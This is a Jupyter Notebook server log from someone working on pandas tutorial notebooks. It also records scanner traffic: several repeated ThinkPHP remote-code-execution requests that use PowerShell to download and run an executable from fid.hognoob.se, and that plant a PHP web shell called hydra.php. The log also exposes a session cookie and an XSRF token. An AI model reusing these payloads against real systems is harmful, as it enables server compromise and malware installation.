+[W 19:23:53.585 NotebookApp] Session not found: session_id='d74bd6b0-779c-47c3-bdb0-33bb4a4567fd'
+[W 19:23:53.586 NotebookApp] 404 DELETE /api/sessions/d74bd6b0-779c-47c3-bdb0-33bb4a4567fd (223.65.190.154) 1.21ms referer=http://114.115.221.15:8888/tree?
+[I 19:23:57.486 NotebookApp] Kernel shutdown: 9e4b6230-54a6-41a0-984e-07f5c8602dc8
+[I 19:25:02.287 NotebookApp] Saving file at /pandas统计计算及描述.ipynb
+[I 19:27:02.321 NotebookApp] Saving file at /pandas统计计算及描述.ipynb
+[I 19:29:02.515 NotebookApp] Saving file at /pandas统计计算及描述.ipynb
+[I 19:31:02.446 NotebookApp] Saving file at /pandas统计计算及描述.ipynb
+[I 19:33:02.314 NotebookApp] Saving file at /pandas统计计算及描述.ipynb
+[I 19:35:06.319 NotebookApp] Saving file at /pandas统计计算及描述.ipynb
+[I 19:36:30.805 NotebookApp] Saving file at /pandas统计计算及描述.ipynb
+[I 19:36:52.911 NotebookApp] Kernel shutdown: 784095ba-c0c1-4ecc-ae8a-a1fe7dd4b153
+[I 19:36:56.345 NotebookApp] Creating new notebook in 
+[I 19:36:57.812 NotebookApp] Kernel started: 81e423b9-ff53-41e4-94c7-f7a2931e25ac
+[I 19:36:59.076 NotebookApp] Adapting to protocol v5.1 for kernel 81e423b9-ff53-41e4-94c7-f7a2931e25ac
+[I 19:37:16.112 NotebookApp] Saving file at /Pandas分组与聚合.ipynb
+[I 19:38:57.877 NotebookApp] Saving file at /Pandas分组与聚合.ipynb
+[I 19:42:57.920 NotebookApp] Saving file at /Pandas分组与聚合.ipynb
+[I 19:44:57.988 NotebookApp] Saving file at /Pandas分组与聚合.ipynb
+[W 19:49:29.079 NotebookApp] WebSocket ping timeout after 119888 ms.
+[I 19:49:34.081 NotebookApp] Starting buffering for 81e423b9-ff53-41e4-94c7-f7a2931e25ac:8f4066fa46c74cac80e1c2c546153156
+[W 19:50:33.485 NotebookApp] WebSocket ping timeout after 119462 ms.
+[I 20:13:05.143 NotebookApp] 302 GET /notebooks/ (123.150.183.213) 1.05ms
+[I 22:02:06.411 NotebookApp] Kernel started: a74f0522-1bdb-4327-b321-1ef0e00d8a2f
+[I 22:02:07.674 NotebookApp] Adapting to protocol v5.1 for kernel a74f0522-1bdb-4327-b321-1ef0e00d8a2f
+[I 22:06:18.773 NotebookApp] Kernel started: 6b68c7cd-4c1a-4ef8-91e7-44f6e3c7420d
+[I 22:06:20.037 NotebookApp] Adapting to protocol v5.1 for kernel 6b68c7cd-4c1a-4ef8-91e7-44f6e3c7420d
+[I 22:25:17.078 NotebookApp] Adapting to protocol v5.1 for kernel 81e423b9-ff53-41e4-94c7-f7a2931e25ac
+[W 22:48:07.677 NotebookApp] WebSocket ping timeout after 119698 ms.
+[I 22:48:12.679 NotebookApp] Starting buffering for a74f0522-1bdb-4327-b321-1ef0e00d8a2f:2f73560dda6945e185b5b0d4d4fbf65c
+[W 22:48:17.081 NotebookApp] WebSocket ping timeout after 119945 ms.
+[W 22:48:20.040 NotebookApp] WebSocket ping timeout after 119815 ms.
+[I 22:48:22.083 NotebookApp] Starting buffering for 81e423b9-ff53-41e4-94c7-f7a2931e25ac:a2690e913f56486d8eac0b246bf41e2c
+[I 22:48:25.041 NotebookApp] Starting buffering for 6b68c7cd-4c1a-4ef8-91e7-44f6e3c7420d:3aba2136a69448908ab72ecfd227f980
+[I 22:49:23.835 NotebookApp] Adapting to protocol v5.1 for kernel 81e423b9-ff53-41e4-94c7-f7a2931e25ac
+[I 22:51:23.299 NotebookApp] Saving file at /Pandas分组与聚合.ipynb
+[I 22:53:23.230 NotebookApp] Saving file at /Pandas分组与聚合.ipynb
+[I 22:55:23.284 NotebookApp] Saving file at /Pandas分组与聚合.ipynb
+[W 22:56:57.336 NotebookApp] 404 GET http://110.249.212.46/testget?q=23333&port=8888 (110.249.212.46) 1.49ms referer=None
+[I 23:58:44.908 NotebookApp] Creating new notebook in 
+[I 23:58:46.640 NotebookApp] Kernel started: 7b8d1ad2-a1a8-46fd-a505-08fcee3e140a
+[I 23:58:47.871 NotebookApp] Adapting to protocol v5.1 for kernel 7b8d1ad2-a1a8-46fd-a505-08fcee3e140a
+[W 23:59:17.924 NotebookApp] 404 HEAD http://123.125.114.144/ (221.13.12.234) 2.41ms referer=None
+[I 00:00:46.924 NotebookApp] Saving file at /pandas数据清洗合并.ipynb
+[I 00:02:46.776 NotebookApp] Saving file at /pandas数据清洗合并.ipynb
+[I 00:04:46.695 NotebookApp] Saving file at /pandas数据清洗合并.ipynb
+[I 00:06:46.709 NotebookApp] Saving file at /pandas数据清洗合并.ipynb
+[W 00:07:35.978 NotebookApp] 404 GET http://www.baidu.com/cache/global/img/gs.gif (80.82.70.187) 1.44ms referer=None
+[I 00:10:26.543 NotebookApp] Saving file at /pandas数据清洗合并.ipynb
+[W 00:27:39.556 NotebookApp] 404 GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe');start%20%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe (114.115.169.38) 1.57ms referer=http://114.115.221.15:8888/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe');start %SystemRoot%/Temp/gocyrqwpxsulimv16735.exe
+[W 00:27:39.559 NotebookApp] 404 GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php (114.115.169.38) 1.15ms referer=http://114.115.221.15:8888/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo ^<?php $action = $_GET['xcmd'];system($action);?^>>hydra.php
+[W 00:27:39.562 NotebookApp] 404 GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe');start%20%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe (114.115.169.38) 1.01ms referer=http://114.115.221.15:8888/public/hydra.php?xcmd=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe');start %SystemRoot%/Temp/gocyrqwpxsulimv16735.exe
+[W 00:47:47.874 NotebookApp] WebSocket ping timeout after 119747 ms.
+[I 00:47:52.875 NotebookApp] Starting buffering for 7b8d1ad2-a1a8-46fd-a505-08fcee3e140a:628136ffa04040c3a2e63bbcc66ba7e2
+[W 00:47:53.838 NotebookApp] WebSocket ping timeout after 119762 ms.
+[I 00:47:58.840 NotebookApp] Starting buffering for 81e423b9-ff53-41e4-94c7-f7a2931e25ac:dbcbae45eb0741968c8908ddae615526
+[I 02:59:06.664 NotebookApp] 302 GET / (139.162.83.10) 0.62ms
+[I 08:45:59.547 NotebookApp] Adapting to protocol v5.1 for kernel 7b8d1ad2-a1a8-46fd-a505-08fcee3e140a
+[I 08:45:59.548 NotebookApp] Restoring connection for 7b8d1ad2-a1a8-46fd-a505-08fcee3e140a:628136ffa04040c3a2e63bbcc66ba7e2
+[W 08:54:55.661 NotebookApp] 404 GET http://clientapi.ipip.net/echo.php?info=1234567890 (139.162.81.62) 1.45ms referer=None
+[I 09:15:40.869 NotebookApp] Saving file at /pandas统计计算及描述.ipynb
+[I 09:15:45.091 NotebookApp] Saving file at /pandas数据清洗合并.ipynb
+[I 09:22:11.781 NotebookApp] Kernel shutdown: 6b68c7cd-4c1a-4ef8-91e7-44f6e3c7420d
+[I 09:22:12.288 NotebookApp] Kernel shutdown: 7b8d1ad2-a1a8-46fd-a505-08fcee3e140a
+[I 09:22:12.593 NotebookApp] Kernel shutdown: a74f0522-1bdb-4327-b321-1ef0e00d8a2f
+[I 09:22:12.998 NotebookApp] Kernel shutdown: 81e423b9-ff53-41e4-94c7-f7a2931e25ac
+[I 09:26:23.164 NotebookApp] 302 GET /notebooks/Untitled.ipynb (101.89.239.230) 0.71ms
+[W 09:30:44.163 NotebookApp] 404 GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe');start%20%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe (114.115.169.38) 1.55ms referer=http://114.115.221.15:8888/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe');start %SystemRoot%/Temp/gocyrqwpxsulimv16735.exe
+[W 09:30:44.166 NotebookApp] 404 GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php (114.115.169.38) 1.21ms referer=http://114.115.221.15:8888/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo ^<?php $action = $_GET['xcmd'];system($action);?^>>hydra.php
+[W 09:30:44.168 NotebookApp] 404 GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe');start%20%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe (114.115.169.38) 1.11ms referer=http://114.115.221.15:8888/public/hydra.php?xcmd=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe');start %SystemRoot%/Temp/gocyrqwpxsulimv16735.exe
+[W 10:18:35.875 NotebookApp] 404 GET http://www.baidu.com/cache/global/img/gs.gif (80.82.70.187) 1.86ms referer=None
+[W 12:37:13.156 NotebookApp] 404 GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe');start%20%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe (114.115.169.38) 2.27ms referer=http://114.115.221.15:8888/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe');start %SystemRoot%/Temp/gocyrqwpxsulimv16735.exe
+[W 12:37:13.159 NotebookApp] 404 GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php (114.115.169.38) 1.20ms referer=http://114.115.221.15:8888/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo ^<?php $action = $_GET['xcmd'];system($action);?^>>hydra.php
+[W 12:37:13.162 NotebookApp] 404 GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe');start%20%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe (114.115.169.38) 1.05ms referer=http://114.115.221.15:8888/public/hydra.php?xcmd=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe');start %SystemRoot%/Temp/gocyrqwpxsulimv16735.exe
+[I 15:17:33.153 NotebookApp] Kernel started: e2d8a533-a33a-4ad7-ba00-fef25a21a06b
+[I 15:17:34.385 NotebookApp] Adapting to protocol v5.1 for kernel e2d8a533-a33a-4ad7-ba00-fef25a21a06b
+[I 15:21:33.243 NotebookApp] Saving file at /pandas数据清洗合并.ipynb
+[I 15:23:33.254 NotebookApp] Saving file at /pandas数据清洗合并.ipynb
+[I 15:25:33.228 NotebookApp] Saving file at /pandas数据清洗合并.ipynb
+[I 15:27:33.208 NotebookApp] Saving file at /pandas数据清洗合并.ipynb
+[I 15:29:33.601 NotebookApp] Saving file at /pandas数据清洗合并.ipynb
+[I 15:31:33.206 NotebookApp] Saving file at /pandas数据清洗合并.ipynb
+[I 15:33:33.218 NotebookApp] Saving file at /pandas数据清洗合并.ipynb
+[I 15:35:33.188 NotebookApp] Saving file at /pandas数据清洗合并.ipynb
+[I 15:41:33.367 NotebookApp] Saving file at /pandas数据清洗合并.ipynb
+[I 15:43:33.177 NotebookApp] Saving file at /pandas数据清洗合并.ipynb
+[I 15:45:33.189 NotebookApp] Saving file at /pandas数据清洗合并.ipynb
+[I 15:51:33.161 NotebookApp] Saving file at /pandas数据清洗合并.ipynb
+[I 15:53:33.161 NotebookApp] Saving file at /pandas数据清洗合并.ipynb
+[I 15:57:33.154 NotebookApp] Saving file at /pandas数据清洗合并.ipynb
+[I 15:59:33.144 NotebookApp] Saving file at /pandas数据清洗合并.ipynb
+[W 16:14:04.984 NotebookApp] 404 HEAD http://123.125.114.144/ (113.128.104.244) 2.23ms referer=None
+[I 16:31:34.301 NotebookApp] Saving file at /pandas数据清洗合并.ipynb
+[I 16:32:30.663 NotebookApp] Saving file at /pandas数据清洗合并.ipynb
+[I 16:32:57.500 NotebookApp] Kernel shutdown: e2d8a533-a33a-4ad7-ba00-fef25a21a06b
+[I 16:32:59.442 NotebookApp] Creating new notebook in 
+[I 16:33:00.802 NotebookApp] Kernel started: 54f5feba-d289-46c6-88d3-5e6a6f517e57
+[I 16:33:02.066 NotebookApp] Adapting to protocol v5.1 for kernel 54f5feba-d289-46c6-88d3-5e6a6f517e57
+[I 16:35:00.845 NotebookApp] Saving file at /pandas数据合并.ipynb
+[I 16:37:00.860 NotebookApp] Saving file at /pandas数据合并.ipynb
+[I 16:39:00.860 NotebookApp] Saving file at /pandas数据合并.ipynb
+[I 16:41:00.898 NotebookApp] Saving file at /pandas数据合并.ipynb
+[I 16:43:00.848 NotebookApp] Saving file at /pandas数据合并.ipynb
+[W 16:45:02.069 NotebookApp] WebSocket ping timeout after 119964 ms.
+[W 16:45:04.387 NotebookApp] WebSocket ping timeout after 119927 ms.
+[E 16:45:05.890 NotebookApp] Uncaught exception PATCH /api/contents/pandas%E6%95%B0%E6%8D%AE%E6%B8%85%E6%B4%97%E5%90%88%E5%B9%B6.ipynb (223.65.190.194)
+    HTTPServerRequest(protocol='http', host='114.115.221.15:8888', method='PATCH', uri='/api/contents/pandas%E6%95%B0%E6%8D%AE%E6%B8%85%E6%B4%97%E5%90%88%E5%B9%B6.ipynb', version='HTTP/1.1', remote_ip='223.65.190.194')
+    Traceback (most recent call last):
+      File "/usr/local/lib/python3.5/dist-packages/tornado/web.py", line 1699, in _execute
+        result = await result
+      File "/usr/lib/python3.5/asyncio/futures.py", line 363, in __iter__
+        return self.result()  # May raise too.
+      File "/usr/lib/python3.5/asyncio/futures.py", line 274, in result
+        raise self._exception
+      File "/usr/local/lib/python3.5/dist-packages/tornado/gen.py", line 209, in wrapper
+        yielded = next(result)
+      File "/usr/local/lib/python3.5/dist-packages/notebook/services/contents/handlers.py", line 125, in patch
+        model = yield gen.maybe_future(cm.update(model, path))
+      File "/usr/local/lib/python3.5/dist-packages/notebook/services/contents/manager.py", line 296, in update
+        self.rename(path, new_path)
+      File "/usr/local/lib/python3.5/dist-packages/notebook/services/contents/manager.py", line 284, in rename
+        self.rename_file(old_path, new_path)
+      File "/usr/local/lib/python3.5/dist-packages/notebook/services/contents/filemanager.py", line 569, in rename_file
+        if os.path.exists(new_os_path) and not samefile(old_os_path, new_os_path):
+      File "/usr/lib/python3.5/genericpath.py", line 90, in samefile
+        s1 = os.stat(f1)
+    FileNotFoundError: [Errno 2] No such file or directory: '/root/jupyter-notebook/pandas数据清洗合并.ipynb'
+[W 16:45:05.939 NotebookApp] Unhandled error
+[E 16:45:05.939 NotebookApp] {
+      "Host": "114.115.221.15:8888",
+      "Dnt": "1",
+      "Accept-Encoding": "gzip, deflate",
+      "X-Xsrftoken": "2|2426260e|9369568f832b0f0afe88cf2e37965498|1558510174",
+      "Content-Length": "35",
+      "X-Requested-With": "XMLHttpRequest",
+      "Content-Type": "application/json",
+      "Connection": "keep-alive",
+      "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+      "Accept": "application/json, text/javascript, */*; q=0.01",
+      "Referer": "http://114.115.221.15:8888/notebooks/pandas%E6%95%B0%E6%8D%AE%E6%B8%85%E6%B4%97%E5%90%88%E5%B9%B6.ipynb",
+      "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0",
+      "Cookie": "username-114-115-221-15-8888=\"2|1:0|10:1558364854|28:username-114-115-221-15-8888|44:NzdiZTBmYjJkNDM4NGFlZWIxYjEyMDM2ODIzYjEyYWE=|ef82710c3fb4b56515ec95925b055881d2a1ddd7c2edcbdfaa6431ba29d2e313\"; _xsrf=2|2426260e|9369568f832b0f0afe88cf2e37965498|1558510174"
+    }
+[E 16:45:05.939 NotebookApp] 500 PATCH /api/contents/pandas%E6%95%B0%E6%8D%AE%E6%B8%85%E6%B4%97%E5%90%88%E5%B9%B6.ipynb (223.65.190.194) 50.35ms referer=http://114.115.221.15:8888/notebooks/pandas%E6%95%B0%E6%8D%AE%E6%B8%85%E6%B4%97%E5%90%88%E5%B9%B6.ipynb
+[I 16:45:07.071 NotebookApp] Starting buffering for 54f5feba-d289-46c6-88d3-5e6a6f517e57:7ddddef7e8214a25848e81d8548848f4
+[W 16:45:08.194 NotebookApp] 404 PATCH /api/sessions/13065a75-2ccf-442c-b4bf-2d3940fb404f (223.65.190.194): Session not found: session_id='13065a75-2ccf-442c-b4bf-2d3940fb404f'
+[W 16:45:08.194 NotebookApp] Session not found: session_id='13065a75-2ccf-442c-b4bf-2d3940fb404f'
+[W 16:45:08.195 NotebookApp] 404 PATCH /api/sessions/13065a75-2ccf-442c-b4bf-2d3940fb404f (223.65.190.194) 1.47ms referer=http://114.115.221.15:8888/notebooks/pandas%E6%95%B0%E6%8D%AE%E6%B8%85%E6%B4%97%E5%90%88%E5%B9%B6.ipynb
+[I 16:45:08.309 NotebookApp] Saving file at /pandas数据合并.ipynb
+[I 16:45:12.588 NotebookApp] Saving file at /pandas数据清洗.ipynb
+[W 16:45:13.518 NotebookApp] 404 POST /api/kernels/e2d8a533-a33a-4ad7-ba00-fef25a21a06b/interrupt (223.65.190.194): Kernel does not exist: e2d8a533-a33a-4ad7-ba00-fef25a21a06b
+[W 16:45:13.519 NotebookApp] Kernel does not exist: e2d8a533-a33a-4ad7-ba00-fef25a21a06b
+[W 16:45:13.519 NotebookApp] 404 POST /api/kernels/e2d8a533-a33a-4ad7-ba00-fef25a21a06b/interrupt (223.65.190.194) 1.37ms referer=http://114.115.221.15:8888/notebooks/pandas%E6%95%B0%E6%8D%AE%E6%B8%85%E6%B4%97.ipynb
+[I 16:45:36.066 NotebookApp] Adapting to protocol v5.1 for kernel 54f5feba-d289-46c6-88d3-5e6a6f517e57
+[I 16:45:36.067 NotebookApp] Restoring connection for 54f5feba-d289-46c6-88d3-5e6a6f517e57:7ddddef7e8214a25848e81d8548848f4
+[W 16:45:36.079 NotebookApp] Replacing stale connection: 54f5feba-d289-46c6-88d3-5e6a6f517e57:7ddddef7e8214a25848e81d8548848f4
+[I 16:45:36.097 NotebookApp] Starting buffering for 54f5feba-d289-46c6-88d3-5e6a6f517e57:7ddddef7e8214a25848e81d8548848f4
+[I 16:45:36.097 NotebookApp] Adapting to protocol v5.1 for kernel 54f5feba-d289-46c6-88d3-5e6a6f517e57
+[I 16:45:36.098 NotebookApp] Restoring connection for 54f5feba-d289-46c6-88d3-5e6a6f517e57:7ddddef7e8214a25848e81d8548848f4
+[I 16:49:01.072 NotebookApp] Saving file at /pandas数据合并.ipynb
+[I 16:51:01.129 NotebookApp] Saving file at /pandas数据合并.ipynb
+[I 17:05:01.194 NotebookApp] Saving file at /pandas数据合并.ipynb
+[I 17:07:01.042 NotebookApp] Saving file at /pandas数据合并.ipynb
+[I 17:09:01.019 NotebookApp] Saving file at /pandas数据合并.ipynb
+[I 17:11:01.008 NotebookApp] Saving file at /pandas数据合并.ipynb
+[W 17:15:36.232 NotebookApp] 404 GET http://www.qq.com/404/search_children.js (120.132.3.65) 1.48ms referer=None
+[W 17:17:07.663 NotebookApp] Replacing stale connection: 54f5feba-d289-46c6-88d3-5e6a6f517e57:7ddddef7e8214a25848e81d8548848f4
+[I 17:17:12.667 NotebookApp] Starting buffering for 54f5feba-d289-46c6-88d3-5e6a6f517e57:7ddddef7e8214a25848e81d8548848f4
+[I 17:17:12.668 NotebookApp] Adapting to protocol v5.1 for kernel 54f5feba-d289-46c6-88d3-5e6a6f517e57
+[I 17:17:12.668 NotebookApp] Restoring connection for 54f5feba-d289-46c6-88d3-5e6a6f517e57:7ddddef7e8214a25848e81d8548848f4
+[W 17:18:51.251 NotebookApp] Replacing stale connection: 54f5feba-d289-46c6-88d3-5e6a6f517e57:7ddddef7e8214a25848e81d8548848f4
+[W 17:18:53.508 NotebookApp] Replacing stale connection: 54f5feba-d289-46c6-88d3-5e6a6f517e57:7ddddef7e8214a25848e81d8548848f4
+[I 17:18:56.255 NotebookApp] Starting buffering for 54f5feba-d289-46c6-88d3-5e6a6f517e57:7ddddef7e8214a25848e81d8548848f4
+[I 17:18:56.257 NotebookApp] Adapting to protocol v5.1 for kernel 54f5feba-d289-46c6-88d3-5e6a6f517e57
+[I 17:18:56.257 NotebookApp] Adapting to protocol v5.1 for kernel 54f5feba-d289-46c6-88d3-5e6a6f517e57
+[I 17:18:56.258 NotebookApp] Restoring connection for 54f5feba-d289-46c6-88d3-5e6a6f517e57:7ddddef7e8214a25848e81d8548848f4
+[W 17:39:17.010 NotebookApp] 404 GET /public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe');start%20%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe (114.115.169.38) 1.53ms referer=http://114.115.221.15:8888/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe');start %SystemRoot%/Temp/gocyrqwpxsulimv16735.exe
+[W 17:39:17.013 NotebookApp] 404 GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php (114.115.169.38) 1.16ms referer=http://114.115.221.15:8888/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo ^<?php $action = $_GET['xcmd'];system($action);?^>>hydra.php
+[W 17:39:17.016 NotebookApp] 404 GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe');start%20%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe (114.115.169.38) 1.05ms referer=http://114.115.221.15:8888/public/hydra.php?xcmd=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','%SystemRoot%/Temp/gocyrqwpxsulimv16735.exe');start %SystemRoot%/Temp/gocyrqwpxsulimv16735.exe
+[W 18:14:06.042 NotebookApp] Replacing stale connection: 54f5feba-d289-46c6-88d3-5e6a6f517e57:7ddddef7e8214a25848e81d8548848f4
+[I 18:14:11.044 NotebookApp] Starting buffering for 54f5feba-d289-46c6-88d3-5e6a6f517e57:7ddddef7e8214a25848e81d8548848f4
+[I 18:14:11.044 NotebookApp] Adapting to protocol v5.1 for kernel 54f5feba-d289-46c6-88d3-5e6a6f517e57
+[I 18:14:11.045 NotebookApp] Restoring connection for 54f5feba-d289-46c6-88d3-5e6a6f517e57:7ddddef7e8214a25848e81d8548848f4
+[W 18:16:39.188 NotebookApp] Replacing stale connection: 54f5feba-d289-46c6-88d3-5e6a6f517e57:7ddddef7e8214a25848e81d8548848f4
+[I 18:16:44.192 NotebookApp] Starting buffering for 54f5feba-d289-46c6-88d3-5e6a6f517e57:7ddddef7e8214a25848e81d8548848f4
+[I 18:16:44.193 NotebookApp] Adapting to protocol v5.1 for kernel 54f5feba-d289-46c6-88d3-5e6a6f517e57
+[I 18:16:44.193 NotebookApp] Restoring connection for 54f5feba-d289-46c6-88d3-5e6a6f517e57:7ddddef7e8214a25848e81d8548848f4
+[I 18:35:01.365 NotebookApp] Saving file at /pandas数据合并.ipynb
+[I 18:37:01.348 NotebookApp] Saving file at /pandas数据合并.ipynb
+[I 18:39:01.928 NotebookApp] Saving file at /pandas数据合并.ipynb
+[I 18:43:42.944 NotebookApp] Kernel interrupted: 54f5feba-d289-46c6-88d3-5e6a6f517e57
+[I 18:45:01.348 NotebookApp] Saving file at /pandas数据合并.ipynb
+[I 18:52:00.947 NotebookApp] 302 GET /notebooks/ (106.39.190.87) 1.05ms
+[I 19:07:41.322 NotebookApp] Kernel interrupted: 54f5feba-d289-46c6-88d3-5e6a6f517e57
+[I 19:07:43.038 NotebookApp] Saving file at /pandas数据合并.ipynb
+[I 19:07:48.160 NotebookApp] Creating new notebook in 
+[I 19:07:49.607 NotebookApp] Kernel started: 50dc1972-9824-4dec-a677-71a911674fb0
+[I 19:07:50.897 NotebookApp] Adapting to protocol v5.1 for kernel 50dc1972-9824-4dec-a677-71a911674fb0
+[I 19:09:49.655 NotebookApp] Saving file at /pandas数据重构.ipynb
+[I 19:11:49.683 NotebookApp] Saving file at /pandas数据重构.ipynb
+[I 19:15:52.898 NotebookApp] Starting buffering for 54f5feba-d289-46c6-88d3-5e6a6f517e57:7ddddef7e8214a25848e81d8548848f4
+[I 19:17:50.195 NotebookApp] Saving file at /pandas数据重构.ipynb
+[I 19:19:50.215 NotebookApp] Saving file at /pandas数据重构.ipynb
+[I 19:21:50.200 NotebookApp] Saving file at /pandas数据重构.ipynb
+[I 19:23:50.206 NotebookApp] Saving file at /pandas数据重构.ipynb
+[I 19:30:47.435 NotebookApp] Kernel shutdown: 54f5feba-d289-46c6-88d3-5e6a6f517e57
+[I 19:30:48.041 NotebookApp] Kernel shutdown: 50dc1972-9824-4dec-a677-71a911674fb0
+[I 19:31:15.486 NotebookApp] Copying dataframe_figure.ipynb to 
+[I 19:31:15.597 NotebookApp] Copying pandas函数应用.ipynb to 
+[I 19:31:15.746 NotebookApp] Copying Pandas分组与聚合.ipynb to 
+[I 19:31:15.775 NotebookApp] Copying pandas对齐运算.ipynb to 
+[I 19:31:15.804 NotebookApp] Copying pandas层级索引.ipynb to 
+[I 19:31:15.830 NotebookApp] Copying pandas数据合并.ipynb to 
+[I 19:31:15.869 NotebookApp] Copying pandas数据重构(DataFrame与Series间进行转换).ipynb to 
+[I 19:31:15.895 NotebookApp] Copying pandas数据清洗.ipynb to 
+[I 19:31:15.936 NotebookApp] Copying matplotlib_test.ipynb to 
+[I 19:31:15.991 NotebookApp] Copying pandas统计计算及描述.ipynb to 
+[I 19:32:16.783 NotebookApp] New terminal with automatic name: 1
+[W 19:35:45.951 NotebookApp] delete /dataframe_figure-Copy1.ipynb
+[W 19:35:45.954 NotebookApp] delete /matplotlib_test-Copy1.ipynb
+[W 19:35:45.982 NotebookApp] delete /pandas函数应用-Copy1.ipynb
+[W 19:35:45.984 NotebookApp] delete /Pandas分组与聚合-Copy1.ipynb
+[W 19:35:45.987 NotebookApp] delete /pandas对齐运算-Copy1.ipynb
+[W 19:35:45.988 NotebookApp] delete /pandas层级索引-Copy1.ipynb
+[W 19:35:45.991 NotebookApp] delete /pandas数据合并-Copy1.ipynb
+[W 19:35:45.998 NotebookApp] delete /pandas数据清洗-Copy1.ipynb
+[W 19:35:46.023 NotebookApp] delete /pandas数据重构(DataFrame与Series间进行转换)-Copy1.ipynb
+[W 19:35:46.027 NotebookApp] delete /pandas统计计算及描述-Copy1.ipynb
